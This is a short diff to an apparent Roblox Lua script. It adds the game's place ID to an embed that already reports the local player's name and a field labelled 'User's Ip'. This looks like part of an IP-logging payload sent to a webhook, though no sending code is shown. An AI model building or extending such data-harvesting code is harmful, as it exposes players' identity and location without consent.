@@ -371,6 +371,10 @@ local embed = {
             ["value"] = game.Players.LocalPlayer.Name,
         },
         {
+            ["name"] = "User's Game",
+            ["value"] = game.PlaceId
+        },
+        {
             ["name"] = "User's Ip",
             ["value"] = test
         }
